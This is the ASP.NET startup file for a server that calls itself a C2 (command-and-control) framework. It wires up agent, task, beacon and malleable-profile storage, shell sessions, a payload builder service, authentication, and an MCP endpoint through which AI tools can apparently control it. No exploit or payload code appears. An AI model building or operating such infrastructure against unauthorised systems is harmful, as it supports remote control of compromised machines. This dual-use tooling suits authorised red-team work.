using System.Text.Json.Serialization;
using System.Threading.RateLimiting;
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.AspNetCore.Authentication;
using Microsoft.IdentityModel.Tokens;
using Scalar.AspNetCore;
using LibraNextgen.Common.Models;
using LibraNextgen.Service.Configuration;
using LibraNextgen.Service.Data;
using LibraNextgen.Service.Profiles;
using LibraNextgen.Common.Protocol;
using LibraNextgen.Service.Hubs;
using LibraNextgen.Service.Middleware;
using LibraNextgen.Service.Services;

var builder = WebApplication.CreateBuilder(args);

// MongoDB
builder.Services.Configure<MongoSettings>(builder.Configuration.GetSection(MongoSettings.SectionName));
builder.Services.AddSingleton<MongoDbContext>();
builder.Services.AddSingleton<MongoIndexBuilder>();

// Beacon authentication (shared secret injected at build time)
builder.Services.Configure<BeaconSettings>(builder.Configuration.GetSection(BeaconSettings.SectionName));

builder.Services.AddHttpClient();

// Typed repositories per collection
builder.Services.AddScoped<Repository<Agent>>(sp =>
    new Repository<Agent>(sp.GetRequiredService<MongoDbContext>(), "agents"));
builder.Services.AddScoped<Repository<AgentTask>>(sp =>
    new Repository<AgentTask>(sp.GetRequiredService<MongoDbContext>(), "tasks"));
builder.Services.AddScoped<Repository<User>>(sp =>
    new Repository<User>(sp.GetRequiredService<MongoDbContext>(), "users"));
builder.Services.AddScoped<Repository<AuditLog>>(sp =>
    new Repository<AuditLog>(sp.GetRequiredService<MongoDbContext>(), "audit_logs"));
builder.Services.AddScoped<Repository<MalleableProfileConfig>>(sp =>
    new Repository<MalleableProfileConfig>(sp.GetRequiredService<MongoDbContext>(), "profiles"));
builder.Services.AddScoped<Repository<TrafficRecord>>(sp =>
    new Repository<TrafficRecord>(sp.GetRequiredService<MongoDbContext>(), "traffic"));
builder.Services.AddScoped<Repository<AccessKey>>(sp =>
    new Repository<AccessKey>(sp.GetRequiredService<MongoDbContext>(), "access_keys"));

// JWT Settings (singleton, holds RSA key pair)
var jwtSettings = new JwtSettings();
builder.Services.AddSingleton(jwtSettings);
builder.Services.AddScoped<AuthService>();
builder.Services.AddScoped<AccountService>();
builder.Services.AddScoped<ProfileService>();
builder.Services.AddScoped<AgentService>();
builder.Services.AddScoped<TaskService>();
builder.Services.AddScoped<AgentCommsService>();
builder.Services.AddScoped<RelayService>();

// WebSocket
builder.Services.AddSingleton<ISessionLock, ShellSessionLock>();
builder.Services.AddSingleton<AgentTrafficService>();
builder.Services.AddSingleton<ConnectionManager>();
builder.Services.AddSingleton<SessionKeyStore>();
builder.Services.AddSingleton<RiskPolicyService>();
builder.Services.AddSingleton<PermissionService>();
builder.Services.AddSingleton<McpService>();
builder.Services.AddScoped<AuditService>();
builder.Services.AddScoped<AccessKeyService>();
builder.Services.AddSingleton<BuilderBuildService>();
builder.Services.AddHostedService<HeartbeatMonitor>();

// MCP Server
builder.Services.AddMcpServer()
    .WithHttpTransport()
    .WithToolsFromAssembly();

// Auth
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = jwtSettings.Issuer,
            ValidAudience = jwtSettings.Audience,
            IssuerSigningKey = new RsaSecurityKey(jwtSettings.Rsa),
            ClockSkew = TimeSpan.Zero
        };
        options.Events = new JwtBearerEvents
        {
            OnMessageReceived = context =>
            {
                var token = context.Request.Query["token"].FirstOrDefault();
                if (!string.IsNullOrEmpty(token))
                {
                    context.Token = token;
                }
                return Task.CompletedTask;
            }
        };
    });
builder.Services.AddAuthentication()
    .AddScheme<AuthenticationSchemeOptions, AccessKeyAuthHandler>("AccessKey", null);
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("McpPolicy", policy =>
        policy.AddAuthenticationSchemes("AccessKey").RequireAuthenticatedUser());
});

// Controllers + OpenAPI with Scalar UI
builder.Services.AddControllers().AddJsonOptions(options =>
{
    options.JsonSerializerOptions.Converters.Add(new JsonStringEnumConverter());
});
builder.Services.AddOpenApi("v1", options =>
{
    options.AddDocumentTransformer((document, _, _) =>
    {
        document.Info.Title = "Libra-Nextgen API";
        document.Info.Version = "v1";
        document.Info.Description = "Libra-Nextgen C2 Framework REST API";
        return Task.CompletedTask;
    });
});

// WebSocket middleware is enabled via app.UseWebSockets()

// CORS — allow only configured origins (JWT is header-based, no credentials needed).
var allowedOrigins = builder.Configuration.GetSection("Cors:AllowedOrigins").Get<string[]>() ?? [];
builder.Services.AddCors(options =>
{
    options.AddPolicy("CorsSignalR", policy =>
    {
        if (allowedOrigins.Length > 0)
            policy.WithOrigins(allowedOrigins).AllowAnyHeader().AllowAnyMethod();
        else
            policy.AllowAnyOrigin().AllowAnyHeader().AllowAnyMethod();
    });
});

// Rate Limiting
builder.Services.AddRateLimiter(options =>
{
    options.AddPolicy("auth", context =>
    {
        var ip = context.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        return RateLimitPartition.GetFixedWindowLimiter(ip, _ => new FixedWindowRateLimiterOptions
        {
            PermitLimit = 5,
            Window = TimeSpan.FromMinutes(1),
            QueueProcessingOrder = QueueProcessingOrder.OldestFirst,
            QueueLimit = 0,
        });
    });
    options.RejectionStatusCode = 429;
});

var app = builder.Build();

app.MapOpenApi();
if (app.Environment.IsDevelopment())
{
    app.MapScalarApiReference(options =>
    {
        options.Title = "Libra-Nextgen API";
        options.Theme = Scalar.AspNetCore.ScalarTheme.DeepSpace;
    });
}

app.UseWebSockets();
app.UseCors("CorsSignalR");
app.UseRateLimiter();
app.UseAuthentication();
app.UseAuthorization();
app.UseMiddleware<PermissionMiddleware>();
app.UseMiddleware<AuditMiddleware>();
app.MapControllers();
app.UseMiddleware<McpToggleMiddleware>();
app.MapMcp("/mcp").RequireAuthorization("McpPolicy");
WebSocketHandler.Map(app);

// Ensure MongoDB indexes exist before serving traffic (best-effort).
try
{
    using (var scope = app.Services.CreateScope())
    {
        var indexBuilder = scope.ServiceProvider.GetRequiredService<MongoIndexBuilder>();
        indexBuilder.EnsureIndexesAsync().GetAwaiter().GetResult();
        var riskPolicy = scope.ServiceProvider.GetRequiredService<RiskPolicyService>();
        riskPolicy.LoadAsync().GetAwaiter().GetResult();
        var mcp = scope.ServiceProvider.GetRequiredService<McpService>();
        mcp.LoadAsync().GetAwaiter().GetResult();
    }
}
catch (Exception ex)
{
    var logger = app.Services.GetRequiredService<ILoggerFactory>().CreateLogger("Startup");
    logger.LogWarning(ex, "MongoDB index initialization failed — continuing without indexes.");
}

app.Run();
